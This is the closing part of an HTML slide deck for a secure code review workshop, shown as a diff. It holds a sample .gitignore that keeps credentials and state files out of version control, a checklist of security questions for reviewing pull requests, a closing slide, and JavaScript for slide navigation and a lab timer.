+      <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span style="font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:8px">.gitignore — infra &amp; cloud</span></div>
+      <pre><span class="c"># Terraform</span>
+<span class="good">*.tfvars
+*.tfstate
+*.tfstate.*
+.terraform/</span>
+
+<span class="c"># Cloud credentials</span>
+<span class="good">.aws/credentials
+.azure/
+.config/gcloud/</span>
+
+<span class="c"># SSH / signing keys</span>
+<span class="good">id_rsa
+id_ed25519
+id_ecdsa</span>
+
+<span class="c"># DB dumps</span>
+<span class="good">*.sql
+*.dump
+dump.rdb</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 24 CHECKLIST -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Wrap-Up · Every PR</div>
+    <h2 class="slide-title">The PR Security Checklist</h2>
+    <div class="slide-sub">Run this mentally before approving any PR with security surface</div>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;flex:1" class="stagger">
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(248,81,73,0.15);color:var(--red)">Input</div>
+      <div class="check-text">All external input validated? SQL queries parameterized? Output encoded for the right context (HTML, JS, shell)?</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(232,116,26,0.15);color:var(--orange)">Auth/Z</div>
+      <div class="check-text">Every endpoint protected? Authorization scoped to user? JWTs validated with explicit algorithms?</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(227,179,65,0.15);color:var(--yellow)">Secrets</div>
+      <div class="check-text">No credentials hardcoded or logged anywhere? Secrets sourced from env vars or a secrets manager?</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(88,166,255,0.15);color:var(--blue)">Deps</div>
+      <div class="check-text">New packages added? Well-maintained? Run npm audit / pip-audit / trivy on the diff.</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(188,140,255,0.15);color:var(--purple)">Crypto</div>
+      <div class="check-text">Standard library functions only? No MD5/SHA1 for passwords, no homebrew crypto, no ECB mode.</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(57,208,192,0.15);color:var(--teal)">Errors</div>
+      <div class="check-text">Do errors leak stack traces, file paths, or internal state to the client?</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(63,185,80,0.15);color:var(--green)">Logging</div>
+      <div class="check-text">Passwords, tokens, PII, or session IDs being logged anywhere in this change?</div>
+    </div>
+    <div class="check-card">
+      <div class="check-cat" style="background:rgba(232,116,26,0.15);color:var(--orange)">Files</div>
+      <div class="check-text">File paths user-controlled? Upload type validated beyond MIME — check magic bytes?</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 25 CLOSE -->
+<section class="slide" id="s-close">
+  <div class="title-grid"></div>
+  <div style="position:relative;z-index:1;max-width:780px">
+    <p class="close-quote">
+      "The best secure code reviewers aren't the ones who know the most vulnerabilities.<br><br>
+      They're the ones who can look at code and ask: <em>what did the developer assume here — and how do I violate that assumption?</em>"
+    </p>
+    <div style="font-family:var(--font-head);font-size:22px;font-weight:800;color:var(--white);margin-bottom:8px">Secure Code Review Workshop</div>
+    <div style="font-family:var(--font-mono);font-size:12px;color:var(--muted);letter-spacing:0.08em">Questions · Feedback · Go break more code</div>
+    <div style="margin-top:32px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap">
+      <span class="title-pill">SQLi ✓</span><span class="title-pill">JWT ✓</span><span class="title-pill">IDOR ✓</span>
+      <span class="title-pill">Command Injection ✓</span><span class="title-pill">Path Traversal ✓</span>
+      <span class="title-pill">XSS ✓</span><span class="title-pill">Secrets ✓</span><span class="title-pill">DevSecOps ✓</span>
+    </div>
+  </div>
+  <div class="red-line"></div>
+</section>
+
+</div><!-- end #deck -->
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────────
+const slides = Array.from(document.querySelectorAll('.slide'));
+let current = 0;
+const total = slides.length;
+
+// ── Cursor ─────────────────────────────────────────────────────────────────────
+const cursor = document.getElementById('cursor');
+const ring   = document.getElementById('cursorRing');
+document.addEventListener('mousemove', e => {
+  cursor.style.transform = `translate(${e.clientX - 5}px, ${e.clientY - 5}px)`;
+  ring.style.transform   = `translate(${e.clientX - 16}px, ${e.clientY - 16}px)`;
+});
+
+// ── Navigation ─────────────────────────────────────────────────────────────────
+function showSlide(idx) {
+  if (idx < 0 || idx >= total) return;
+  slides[current].classList.remove('active', 'visible', 'entering');
+  slides[current].classList.add('leaving');
+  setTimeout(() => slides[current].classList.remove('leaving'), 300);
+
+  current = idx;
+  const s = slides[current];
+  s.classList.add('active');
+  requestAnimationFrame(() => {
+    s.classList.add('entering', 'visible');
+    setTimeout(() => s.classList.remove('entering'), 380);
+    // Trigger stagger
+    const stagger = s.querySelector('.stagger');
+    if (stagger) {
+      stagger.classList.remove('go');
+      setTimeout(() => stagger.classList.add('go'), 60);
+    }
+  });
+
+  document.getElementById('slide-counter').textContent = `${current + 1} / ${total}`;
+  document.getElementById('progress-bar').style.width = `${((current + 1) / total) * 100}%`;
+  document.getElementById('nav-prev').style.opacity = current === 0 ? '0.2' : '1';
+  document.getElementById('nav-next').style.opacity = current === total - 1 ? '0.2' : '1';
+}
+
+function nextSlide() { showSlide(current + 1); }
+function prevSlide() { showSlide(current - 1); }
+
+// Keyboard
+document.addEventListener('keydown', e => {
+  if (e.key === 'ArrowRight' || e.key === 'ArrowDown' || e.key === ' ')  { e.preventDefault(); nextSlide(); }
+  if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')   { e.preventDefault(); prevSlide(); }
+  if (e.key === 'f' || e.key === 'F') document.documentElement.requestFullscreen?.();
+  if (e.key === 'Home') showSlide(0);
+  if (e.key === 'End')  showSlide(total - 1);
+});
+
+// Click edges
+document.getElementById('deck').addEventListener('click', e => {
+  const w = window.innerWidth;
+  if (e.clientX < w * 0.2) prevSlide();
+  else if (e.clientX > w * 0.8) nextSlide();
+});
+
+// Touch swipe
+let touchX = 0;
+document.addEventListener('touchstart', e => { touchX = e.touches[0].clientX; });
+document.addEventListener('touchend', e => {
+  const diff = touchX - e.changedTouches[0].clientX;
+  if (Math.abs(diff) > 50) diff > 0 ? nextSlide() : prevSlide();
+});
+
+// ── Lab Timer ────────────────────────────────────────────────────────────────
+let timerInterval = null;
+let timerSeconds = 1200;
+function startTimer() {
+  if (timerInterval) return;
+  timerInterval = setInterval(() => {
+    timerSeconds--;
+    if (timerSeconds <= 0) { clearInterval(timerInterval); timerInterval = null; timerSeconds = 0; }
+    updateTimerDisplay();
+  }, 1000);
+}
+function resetTimer() {
+  clearInterval(timerInterval); timerInterval = null;
+  timerSeconds = 1200; updateTimerDisplay();
+}
+function updateTimerDisplay() {
+  const m = Math.floor(timerSeconds / 60).toString().padStart(2, '0');
+  const s = (timerSeconds % 60).toString().padStart(2, '0');
+  const el = document.getElementById('timer-display');
+  if (el) {
+    el.textContent = `${m}:${s}`;
+    el.style.color = timerSeconds <= 60 ? 'var(--red)' : timerSeconds <= 300 ? 'var(--orange)' : 'var(--orange)';
+  }
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+showSlide(0);
+
+// open-card colors based on index
+document.querySelectorAll('.open-card').forEach((c, i) => {
+  const colors = ['var(--yellow)','var(--orange)','var(--red)','var(--blue)','var(--purple)','var(--teal)','var(--green)'];
+  c.style.setProperty('--ac', colors[i % colors.length]);
+  c.style.cssText += `; border-left: 3px solid ${colors[i % colors.length]}`;
+});
+</script>
+</body>
+</html>
